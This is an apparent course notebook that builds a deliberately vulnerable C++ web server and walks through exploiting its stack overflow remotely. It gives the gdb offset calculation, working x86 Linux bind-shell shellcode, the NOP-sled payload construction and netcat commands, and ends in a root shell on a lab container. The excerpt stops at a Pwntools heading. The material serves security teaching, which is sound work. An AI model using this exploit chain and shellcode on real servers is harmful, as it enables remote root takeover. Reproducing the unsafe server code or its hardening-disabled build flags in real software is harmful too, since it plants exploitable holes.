{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# A Tiny Web Server & Its Exploitation\n",
    "\n",
    "- similar to simple server but uses HTTP protocol to communicate; hence called Web Server\n",
    "- handles HTTP GET and HEAD requests\n",
    "- looks for the requested resource in the local directory callled `webroot` and sends it to the client/browser\n",
    "- if the file/resource is not found, the server responds with 404 HTTP (`File Not Found`) error in response\n",
    "- a tiny web server that serves static html webpage\n",
    "- see `demos/server/tinyweb`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/home/kali/projects/SoftwareSecurity/notebooks'"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# check the working directory\n",
    "%pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/projects/SoftwareSecurity/demos/server/tinyweb\n"
     ]
    }
   ],
   "source": [
    "%cd ../demos/server/tinyweb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer\t\t     exploit.py\t\tmain.o\t\t\t tinyweb.exe\r\n",
      "core.26\t\t     junk.txt\t\tMakefile\t\t util\r\n",
      "docker-compose.yaml  local_exploit.bin\tport_bind_exploit.bin\t webroot\r\n",
      "Dockerfile\t     main.cpp\t\tport_bind_shellcode.bin\r\n"
     ]
    }
   ],
   "source": [
    "# list files and folders from current working directory\n",
    "! ls"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <fcntl.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "#include <unistd.h>\r\n",
      "#include <sys/stat.h>\r\n",
      "#include <sys/socket.h>\r\n",
      "#include <netinet/in.h>\r\n",
      "#include <arpa/inet.h>\r\n",
      "#include \"./util/utility.h\"\r\n",
      "#include \"./util/net_utility.h\"\r\n",
      "\r\n",
      "enum REQUEST_TYPE {GET, POST, HEAD, UNKNOWN};\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "#define PORT 80   // the port users will be connecting to\r\n",
      "#define WEBROOT \"./webroot\" // the web server's root directory\r\n",
      "\r\n",
      "void handle_connection(int, struct sockaddr_in *); // handle web requests\r\n",
      "int get_file_size(int); // returns the filesize of open file descriptor\r\n",
      "void send_file_not_found(const int); // send file not found error\r\n",
      "void send_file(const int, char *); // send file/resource requested\r\n",
      "void send_buffer_address(const int, char *); // send buffer address\r\n",
      "\r\n",
      "int main(void) {\r\n",
      "   int sockfd, new_sockfd, yes=1; \r\n",
      "   struct sockaddr_in host_addr, client_addr;   // my address information\r\n",
      "   socklen_t sin_size;\r\n",
      "\r\n",
      "   printf(\"Accepting web requests on port %d\\n\", PORT);\r\n",
      "\r\n",
      "   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\r\n",
      "      fatal(\"in socket\");\r\n",
      "\r\n",
      "   if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)\r\n",
      "      fatal(\"setting socket option SO_REUSEADDR\");\r\n",
      "\r\n",
      "   host_addr.sin_family = AF_INET;      // host byte order\r\n",
      "   host_addr.sin_port = htons(PORT);    // short, network byte order\r\n",
      "   host_addr.sin_addr.s_addr = INADDR_ANY; // automatically fill with my IP\r\n",
      "   memset(&(host_addr.sin_zero), '\\0', 8); // zero the rest of the struct\r\n",
      "\r\n",
      "   if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)\r\n",
      "      fatal(\"binding to socket\");\r\n",
      "\r\n",
      "   if (listen(sockfd, 20) == -1)\r\n",
      "      fatal(\"listening on socket\");\r\n",
      "\r\n",
      "   while(1) {   // Accept loop\r\n",
      "      sin_size = sizeof(struct sockaddr_in);\r\n",
      "      new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\r\n",
      "      if(new_sockfd == -1)\r\n",
      "         fatal(\"accepting connection\");\r\n",
      "\r\n",
      "      handle_connection(new_sockfd, &client_addr);\r\n",
      "   }\r\n",
      "   return 0;\r\n",
      "}\r\n",
      "\r\n",
      "/* This function handles the connection on the passed socket from the\r\n",
      " * passed client address.  The connection is processed as a web request\r\n",
      " * and this function replies over the connected socket.  Finally, the \r\n",
      " * passed socket is closed at the end of the function.\r\n",
      " */\r\n",
      "void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr) {\r\n",
      "\tchar *ptr, request[500];\r\n",
      "\tint length = 0;\r\n",
      "\tREQUEST_TYPE req_type = UNKNOWN;\r\n",
      "\t\r\n",
      "\tchar address[100];\r\n",
      "\tsprintf(address, \"Request buffer @ %p\\r\\n\", request);\r\n",
      "\tprintf(\"%s\", address);\r\n",
      "\t// receive one line from client and store it into request buffer\r\n",
      "\tlength = recv_line(sockfd, request);\r\n",
      "\r\n",
      "\tprintf(\"Got request from %s:%d \\\"%s\\\"\\n\", inet_ntoa(client_addr_ptr->sin_addr), ntohs(client_addr_ptr->sin_port), request);\r\n",
      "\tprintf(\"Received: %d bytes\\n\", length);\r\n",
      "\r\n",
      "\tptr = strstr(request, \" HTTP/\"); // search for valid looking request\r\n",
      "\tif(ptr == NULL) { // then this isn't valid HTTP\r\n",
      "\t\tprintf(\" NOT HTTP!\\n\");\r\n",
      "\t} \r\n",
      "\telse {\r\n",
      "\t\t*ptr = 0; // terminate the buffer at the end of the URL\r\n",
      "\t\tptr = NULL; // set ptr to NULL (used to flag for an invalid request)\r\n",
      "\t\tif(strncmp(request, \"GET \", 4) == 0) {  // get request\r\n",
      "\t\t\tptr = request+4; // ptr is the URL\r\n",
      "\t\t\treq_type = GET;\r\n",
      "\t\t}\r\n",
      "\t\tif(strncmp(request, \"HEAD \", 5) == 0) { // head request\r\n",
      "\t\t \tptr = request+5; // ptr is the URL\r\n",
      "\t\t \treq_type = HEAD;\r\n",
      "\t\t}\r\n",
      "\r\n",
      "\t\tif(req_type == UNKNOWN) { // then this is not a recognized request\r\n",
      "\t\t\tprintf(\"\\tUNKNOWN REQUEST!\\n\");\r\n",
      "\t\t} \r\n",
      "\t\telse if (req_type == GET) { // valid request, with ptr pointing to the resource name\r\n",
      "\t\t    if (strncmp(ptr, \"/buffer\", 7) == 0)\r\n",
      "\t\t        send_buffer_address(sockfd, address);\r\n",
      "\t\t    else\r\n",
      "\t\t\t    send_file(sockfd, ptr);\r\n",
      "\t    }\r\n",
      "   } // end if block for valid HTTP\r\n",
      "   shutdown(sockfd, SHUT_RDWR); // close the socket gracefully\r\n",
      "}\r\n",
      "\r\n",
      "/* This function accepts an open file descriptor and returns     \r\n",
      " * the size of the associated file.  Returns -1 on failure.\r\n",
      " */\r\n",
      "int get_file_size(int fd) {\r\n",
      "\tstruct stat stat_struct;\r\n",
      "\r\n",
      "\tif(fstat(fd, &stat_struct) == -1)\r\n",
      "\t\treturn -1;\r\n",
      "\treturn (int) stat_struct.st_size;\r\n",
      "}\r\n",
      "\r\n",
      "void send_file_not_found(const int sockfd) {\r\n",
      "\tprintf(\" 404 Not Found\\n\");\r\n",
      "\tsend_string(sockfd, \"HTTP/1.1 404 NOT FOUND\\r\\n\");\r\n",
      "\tsend_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\r\n",
      "\tsend_string(sockfd, \"<html><head><title>404 Not Found</title></head>\");\r\n",
      "\tsend_string(sockfd, \"<body><h1>URL not found</h1></body></html>\\r\\n\");\r\n",
      "}\r\n",
      "\r\n",
      "void send_file(const int sockfd, char *ptr) {\r\n",
      "\t// handle GET request\r\n",
      "\tchar resource[500];\r\n",
      "\tint fd, length;\r\n",
      "\r\n",
      "\tif (ptr[strlen(ptr) - 1] == '/')  // for resources ending with '/'\r\n",
      "\t\tstrcat(ptr, \"index.html\");     // add 'index.html' to the end\r\n",
      "\tstrcpy(resource, WEBROOT);     // begin resource with web root path\r\n",
      "\tstrcat(resource, ptr);         //  and append resource path\r\n",
      "\r\n",
      "\tfd = open(resource, O_RDONLY, 0); // try to open the file\r\n",
      "\tprintf(\"\\tOpening \\'%s\\'\\t\", resource);\r\n",
      "\r\n",
      "\tif(fd == -1) { // if file is not found\r\n",
      "\t\tsend_file_not_found(sockfd);\r\n",
      "\t} \r\n",
      "\telse {      // otherwise, serve up the file\r\n",
      "\t\tprintf(\" 200 OK\\n\");\r\n",
      "\t\tsend_string(sockfd, \"HTTP/1.1 200 OK\\r\\n\");\r\n",
      "\t\tsend_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\r\n",
      "\t\t\r\n",
      "\t\tif( (length = get_file_size(fd)) == -1)\r\n",
      "\t\t\tfatal(\"getting resource file size\");\r\n",
      "\r\n",
      "\t\tptr = (char *) malloc(length);\r\n",
      "\t\tif(ptr == NULL)\r\n",
      "\t\t\tfatal(\"allocating memory for reading resource\");\r\n",
      "\r\n",
      "\t\tread(fd, ptr, length); // read the file into memory\r\n",
      "\t\tsend(sockfd, ptr, length, 0);  // send it to socket\r\n",
      "\t\tfree(ptr); // free file memory\r\n",
      "\t\tclose(fd); // close the file\r\n",
      "\t} // end if block for file found/not found\r\n",
      "}\r\n",
      "\r\n",
      "void send_buffer_address(const int sockfd, char *ptr) {\r\n",
      "    printf(\" 200 OK\\n\");\r\n",
      "\tsend_string(sockfd, \"HTTP/1.1 200 OK\\r\\n\");\r\n",
      "\tsend_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\r\n",
      "\tsend_string(sockfd, \"<html><head><title>Request Buffer Address</title></head>\");\r\n",
      "\tchar response[200];\r\n",
      "\tsprintf(response, \"<body><p style=\\\"color: red;\\\">%s</p></body></html>\\r\\n\", ptr);\r\n",
      "\tsend_string(sockfd, response);\r\n",
      "}\r\n"
     ]
    }
   ],
   "source": [
    "! cat main.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat util/net_utility.h"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "! cat webroot/index.html"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat ./util/net_utility.h"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat Makefile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat ./util/utility.h"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Build and run Server Docker image\n",
    "\n",
    "- NOTE - don't build the tinyweb server in the Docker; disabling -fno-stack-protector is not working!\n",
    "- use provided `docker-compose` file that uses `Dockerfile` to build and run the image\n",
    "- compile tiny web server and run it using Makefile from Docker Terminal\n",
    "- access the IP address using the host browser\n",
    "- observe the log on the server\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/server/tinyweb]\n",
    "└─$ docker-compose up --build -d\n",
    "\n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/server/tinyweb]\n",
    "└─$ docker container ls         \n",
    "CONTAINER ID   IMAGE            COMMAND                  CREATED             STATUS             PORTS                               NAMES\n",
    "cc1590ca3f63   tinyweb_server   \"sh -c 'echo 0 > /pr…\"   About an hour ago   Up About an hour   0.0.0.0:80->80/tcp, :::80->80/tcp   tinyweb\n",
    "\n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/server/tinyweb]\n",
    "└─$ docker exec -it tinyweb bash\n",
    "root@tinyweb:/var/www# \n",
    "\n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/server/tinyweb]\n",
    "└─$ docker exec -it tinyweb bash\n",
    "root@tinyweb:/var/www# ifconfig | grep inet\n",
    "        inet 192.168.16.2  netmask 255.255.240.0  broadcast 192.168.31.255\n",
    "        inet 127.0.0.1  netmask 255.0.0.0\n",
    "        inet6 ::1  prefixlen 128  scopeid 0x10<host>\n",
    "\n",
    "root@tinyweb:/var/www# make\n",
    "# compiles .cpp to object file .o\n",
    "g++ -c -g -Wall -std=c++17 -m32 main.cpp\n",
    "# builds executable from object files\n",
    "g++ -m32 -fno-stack-protector -z execstack -no-pie -o tinyweb.exe *.o\n",
    "chown root:root tinyweb.exe\n",
    "chmod u+s tinyweb.exe\n",
    "./tinyweb.exe\n",
    "Accepting web requests on port 80\n",
    "Got request from 192.168.16.1:44262 \"GET / HTTP/1.1\"\n",
    "Received: 14 bytes\n",
    "        Opening './webroot/index.html'   200 OK\n",
    "Got request from 192.168.16.1:44270 \"GET /image.jpg HTTP/1.1\"\n",
    "Received: 23 bytes\n",
    "        Opening './webroot/image.jpg'    200 OK\n",
    "Got request from 192.168.16.1:44286 \"GET /image.jpg\"\n",
    "Received: 0 bytes\n",
    " NOT HTTP!\n",
    " \n",
    " \n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/server/tinyweb]\n",
    "└─$ wget 192.168.16.2\n",
    "--2025-04-06 00:15:09--  http://192.168.16.2/\n",
    "Connecting to 192.168.16.2:80... connected.\n",
    "HTTP request sent, awaiting response... 200 OK\n",
    "Length: unspecified\n",
    "Saving to: ‘index.html.1’\n",
    "\n",
    "index.html.1                     [ <=>                                        ]     401  --.-KB/s    in 0s      \n",
    "\n",
    "2025-04-06 00:15:09 (42.6 MB/s) - ‘index.html.1’ saved [401]\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Server Stackoverflow Vulnerability & Exploitation\n",
    "\n",
    "- same concept as the previous stackoverflow vulnerability & exploitation\n",
    "- only difference is that the input data to buffer is coming from remote client via TCP/IP\n",
    "- server has stack overflow vulnerability in `recvline(...)` of `util/net_utility.h` file\n",
    "\n",
    "#### Crash Tinyweb server\n",
    "\n",
    "- use a different VM or a machine (attacker machine)\n",
    "- generate a junk data of 1000 bytes and send it to the server\n",
    "- Web server's including Tinyweb server users `\\r\\n` as a delimeter to end the request string"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! python -c 'print(\"A\"*1000, end=\"\\r\\n\")' > junk.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! hexdump -C junk.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# count the number of bytes\n",
    "! wc -c junk.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### send junk\n",
    "- replace tinyserver ip and port\n",
    "- send the junk from different VM or system\n",
    "\n",
    "#### attacker machine\n",
    "\n",
    "```bash\n",
    "$ cat junk.txt | nc -v [tinyseverip] [port]\n",
    "```\n",
    "\n",
    "#### tiny webserver target\n",
    "\n",
    "root@tinyweb:/var/www# make run\n",
    "./tinyweb.exe\n",
    "Accepting web requests on port 80\n",
    "Request buffer @ 0xffffd400\n",
    "Got request from 192.168.144.1:50322 \"GET /buffer HTTP/1.1\"\n",
    "Received: 20 bytes\n",
    " 200 OK\n",
    "ls\n",
    "^HRequest buffer @ 0xffffd400\n",
    "make: *** [Makefile:29: run] Segmentation fault (core dumped)\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "jp-MarkdownHeadingCollapsed": true
   },
   "source": [
    "## Pawn the Docker running Tinyweb server\n",
    "\n",
    "- find the overflow vulnerability\n",
    "- find the return address and offset from `request` buffer\n",
    "    - this will give us the length of the payload we need to build\n",
    "\n",
    "### Using GDB on a running process\n",
    "\n",
    "- download the opensource/binary and run it locally\n",
    "- run the tinyweb.exe and get its process id to attach it to the gdb\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/SoftwareSecurity/demos/server/tinyweb]\n",
    "└─$ ps aux | grep tinyweb             \n",
    "root       12385  0.0  0.0   2452   520 pts/3    S+   13:33   0:00 ./tinyweb.exe\n",
    "kali       12398  0.0  0.0   6184   708 pts/4    S+   13:34   0:00 grep --color=auto tinyweb\n",
    "```\n",
    "\n",
    "- Attach gdb to the tinyweb server\n",
    "\n",
    "```\n",
    "$ sudo gdb -q --pid=[tinywebpid] --symbols=./tinyweb.exe\n",
    "```\n",
    "\n",
    "- use gdb to examine memory and addresses\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/SoftwareSecurity/demos/server/tinyweb]\n",
    "└─$ sudo gdb -q --pid=12385 --symbols=./tinyweb.exe\n",
    "[sudo] password for kali: \n",
    "Reading symbols from ./tinyweb.exe...\n",
    "Attaching to process 12385\n",
    "Load new symbol table from \"/home/kali/projects/NetworkSecurity/demos/tinyweb/tinyweb.exe\"? (y or n) ycreate\n",
    "Reading symbols from /home/kali/projects/NetworkSecurity/demos/tinyweb/tinyweb.exe...\n",
    "Reading symbols from /lib32/libc.so.6...\n",
    "(No debugging symbols found in /lib32/libc.so.6)\n",
    "Reading symbols from /lib/ld-linux.so.2...\n",
    "(No debugging symbols found in /lib/ld-linux.so.2)\n",
    "--Type <RET> for more, q to quit, c to continue without paging--c\n",
    "0xf7fd0559 in __kernel_vsyscall ()  \n",
    "\n",
    "(gdb) list main # list 10 lines around main\n",
    "20      void handle_connection(int, struct sockaddr_in *); // handle web requests\n",
    "21      int get_file_size(int); // returns the filesize of open file descriptor\n",
    "22      void send_file_not_found(const int); // send file not found error\n",
    "23      void send_file(const int, char *); // send file/resource requested\n",
    "24\n",
    "25      int main(void) {\n",
    "26         int sockfd, new_sockfd, yes=1; \n",
    "27         struct sockaddr_in host_addr, client_addr;   // my address information\n",
    "28         socklen_t sin_size;\n",
    "29\n",
    "(gdb)\n",
    "(gdb) list 75 # list 10 lines around line #75\n",
    "70              // receive one line from client and store it into request buffer\n",
    "71              length = recv_line(sockfd, request);\n",
    "72\n",
    "73              printf(\"Got request from %s:%d \\\"%s\\\"\\n\", inet_ntoa(client_addr_ptr->sin_addr), ntohs(client_addr_ptr->sin_port), request);\n",
    "74\n",
    "75              ptr = strstr(request, \" HTTP/\"); // search for valid looking request\n",
    "76              if(ptr == NULL) { // then this isn't valid HTTP\n",
    "77                      printf(\" NOT HTTP!\\n\");\n",
    "78              } \n",
    "79              else {                                                                     \n",
    "\n",
    "$ break 71 # break at recv_line function that has overrun issue\n",
    "\n",
    "$ continue # make a get request using a terminal or browser to hit the breakpoint\n",
    "$ print request\n",
    "$ print /x &request # Note the address of request variable\n",
    "$1 = (char (*)[500]) 0xffffb770\n",
    "(gdb) \n",
    "\n",
    "\n",
    "$ x/16wx request+500 # examine 16 words at request+500 bytes in stack - return address must be definitely 500 bytes away from request!\n",
    "(gdb) x /16wx request+500\n",
    "0xffffb964:     0x00000000      0x00000003      0x2ddeb000      0x0804cff4\n",
    "0xffffb974:     0x0804cff4      0xffffba78      **0x08049a77**      0x00000004\n",
    "0xffffb984:     0xffffb994      0xffffb990      0x0804977c      0x00000010\n",
    "0xffffb994:     0x06dd0002      0x0100007f      0x00000000      0x00000000\n",
    "\n",
    "(gdb) bt # find the return address to main\n",
    "#0  handle_connection (sockfd=4, client_addr_ptr=0xffffb994) at main.cpp:71\n",
    "#1  0x08049a77 in main () at main.cpp:55\n",
    "\n",
    "# return address to main is also stored at $ebp+4 \n",
    "(gdb) x/x $ebp+4\n",
    "0xffffb97c:     0x08049a77\n",
    "\n",
    "# OFFSET to return address\n",
    "$ p /u <location of return address> - <request address> \n",
    "(gdb) p /u 0xffffb97c - 0xffffb770\n",
    "$2 = 524\n",
    "\n",
    "# find the address of about 100 bytes from the base of request (controlled return address)\n",
    "(gdb) p /x request+100\n",
    "$3 = 0xffffb7d4\n",
    "```\n",
    "\n",
    "- exit the debugger and rerun the server on the same terminal"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Remote Exploit\n",
    "\n",
    "- local exploit is not practical in real-world, why?\n",
    "- let's create a port binding shellcode so the attacker can remotely login to the victim once pwned\n",
    "- use a different VM or system as an attacker machine\n",
    "- create Port Binding Shellcode Exploit\n",
    "- Generate Shellcode using GDB PEDA\n",
    "- write the binary shellcode to a file\n",
    "- add about 100 bytes to the beginning address of `request` buffer to get the working landing address\n",
    "\n",
    "### Generate port binding shellcode\n",
    "\n",
    "- make sure to provide IP of the target/victim system and available ports above 1024\n",
    "- gdb-peda$ shellcode generate x86/linux bindport <port> <ip>\n",
    "- find victim's IP address\n",
    "- pick a port, e.g. 9999 # that's unlikely in use by the Tinyweb server\n",
    "- find the IP of tinyweb server to generate the shellcode\n",
    "- e.g., 192.168.144.2 is the IP of my Docker running the tinweb server\n",
    "    \n",
    "```bash\n",
    "┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/server/tinyweb]\n",
    "└─$ ifconfig        \n",
    "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n",
    "        inet 192.168.47.130  netmask 255.255.255.0  broadcast 192.168.47.255\n",
    "        inet6 fe80::ed5d:b4c2:d275:17ca  prefixlen 64  scopeid 0x20<link>\n",
    "        ether 00:0c:29:8a:20:62  txqueuelen 1000  (Ethernet)\n",
    "        RX packets 47707  bytes 68315780 (65.1 MiB)\n",
    "        RX errors 0  dropped 0  overruns 0  frame 0\n",
    "        TX packets 4863  bytes 456804 (446.0 KiB)\n",
    "        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n",
    "\n",
    "\n",
    "┌──(kali㉿K)-[~]\n",
    "└─$ gdb -q           \n",
    "gdb-peda$ shellcode generate\n",
    "Available shellcodes:                                                                          \n",
    "    x86/linux exec                                                                           \n",
    "    x86/linux bindport                                                                       \n",
    "    x86/linux connect                                                                       \n",
    "    x86/bsd exec                                                                             \n",
    "    x86/bsd bindport\n",
    "    x86/bsd connect\n",
    "\n",
    "\n",
    "gdb-peda$ shellcode generate x86/linux bindport 9999 192.168.144.2\n",
    "# x86/linux/bindport: 84 bytes\n",
    "# port=9999, host=192.168.144.2\n",
    "shellcode = (\n",
    "    \"\\x31\\xdb\\x53\\x43\\x53\\x6a\\x02\\x6a\\x66\\x58\\x99\\x89\\xe1\\xcd\\x80\\x96\"\n",
    "    \"\\x43\\x52\\x66\\x68\\x27\\x0f\\x66\\x53\\x89\\xe1\\x6a\\x66\\x58\\x50\\x51\\x56\"\n",
    "    \"\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xd1\\xe3\\xcd\\x80\\x52\\x52\\x56\\x43\\x89\\xe1\"\n",
    "    \"\\xb0\\x66\\xcd\\x80\\x93\\x6a\\x02\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\"\n",
    "    \"\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\"\n",
    "    \"\\x89\\xe1\\xcd\\x80\"\n",
    ")\n",
    "\n",
    "gdb-peda$ quit\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# FIXME: update your binary shellcode from PEDA...\n",
    "# x86/linux/bindport: 84 bytes\n",
    "# port=9999, host=192.168.144.2\n",
    "shellcode = (\n",
    "    b\"\\x31\\xdb\\x53\\x43\\x53\\x6a\\x02\\x6a\\x66\\x58\\x99\\x89\\xe1\\xcd\\x80\\x96\"\n",
    "    b\"\\x43\\x52\\x66\\x68\\x27\\x0f\\x66\\x53\\x89\\xe1\\x6a\\x66\\x58\\x50\\x51\\x56\"\n",
    "    b\"\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xd1\\xe3\\xcd\\x80\\x52\\x52\\x56\\x43\\x89\\xe1\"\n",
    "    b\"\\xb0\\x66\\xcd\\x80\\x93\\x6a\\x02\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\"\n",
    "    b\"\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\"\n",
    "    b\"\\x89\\xe1\\xcd\\x80\"\n",
    ")\n",
    "\n",
    "\n",
    "#FIXME: provide abs or relative path/file_name of the binary file to create\n",
    "fileName = \"port_bind_shellcode.bin\"\n",
    "\n",
    "# open and write binary to the file\n",
    "\n",
    "with open(fileName, 'wb') as fout:\n",
    "\tfout.write(shellcode)\n",
    "\n",
    "print(f'All done! Binary file created: {fileName}') "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! hexdump -C port_bind_shellcode.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Use Python script to create binary shellcode file\n",
    "\n",
    "- alternatively, a Python script `shellcode_writer.py`is provided in shellcode folder to simplify generating binary shellcode file \n",
    "- can simply copy paste shellcode generated by PEDA and update the filename\n",
    "- the program when run will generate the binary file with shellcode"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! wc -c port_bind_shellcode.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# lets create the exploit code to send to the server\n",
    "# find the size of the NOP sled; repeat the buffer address 50 times\n",
    "528-84-(50*4)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! python3 -c 'import sys; sys.stdout.buffer.write(b\"\\x90\"*244)' > port_bind_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's append the shellcode\n",
    "! cat port_bind_shellcode.bin >> port_bind_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# can't have 00 in the address\n",
    "! python -c 'print(hex(0xffffd400+120))'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's write the repeated return address: 0xffffc144\n",
    "! python3 -c 'import sys; sys.stdout.buffer.write(b\"\\x78\\xd4\\xff\\xff\"*50)' >> port_bind_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! wc -c port_bind_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's append the end of request delimeter \\r\\n\n",
    "! python3 -c 'import sys; sys.stdout.buffer.write(b\"\\r\\n\")' >> port_bind_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! wc -c port_bind_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! hexdump -C port_bind_exploit.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Expolit the Tinyweb Server\n",
    "- rerun the Tinyweb server on the target machine\n",
    "- send `port_bind_exploit.bin` from a different VM to the target machine\n",
    "    - this mimics the real-world server exploitation \n",
    "- use netcat as demonstrated in the local exploit above\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/NetworkSecurity]\n",
    "└─$ cat port_bind_exploit.bin | nc -v <192.168.142.2> 80 \n",
    "```\n",
    "\n",
    "- Tinyweb when exploited will run the port binding shellcode at port 9999 as shown below\n",
    "\n",
    "```bash\n",
    "root@tinyweb:/var/www# make run\n",
    "./tinyweb.exe\n",
    "Accepting web requests on port 80\n",
    "Request buffer @ 0xffffd400\n",
    "Got request from 192.168.144.1:33034 \"GET /buffer HTTP/1.1\"\n",
    "Received: 20 bytes\n",
    " 200 OK\n",
    "Request buffer @ 0xffffd400\n",
    "Got request from 192.168.144.1:55104 \"����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�SCSjjfX����CRfh'fS��jfXPQV���f��RRVC���f�jY�?Iy��\n",
    "                                                                           Rh//shh/bin��RS��x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���\"\n",
    "Received: 528 bytes\n",
    " NOT HTTP!\n",
    "```\n",
    "\n",
    "- use another terminal from the attcker machine to netcat to port 9999\n",
    "- once connected, you'll not see the prompt `$` `or `#`, but you can still issue commands on the pwned target\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/server/tinyweb]\n",
    "└─$ nc 192.168.144.2 9999          \n",
    "ls\n",
    "Dockerfile\n",
    "Makefile\n",
    "buffer\n",
    "core.26\n",
    "docker-compose.yaml\n",
    "exploit.py\n",
    "junk.txt\n",
    "local_exploit.bin\n",
    "main.cpp\n",
    "main.o\n",
    "port_bind_exploit.bin\n",
    "port_bind_shellcode.bin\n",
    "tinyweb.exe\n",
    "util\n",
    "webroot\n",
    "whoami\n",
    "root\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exploit using Pwntools\n",
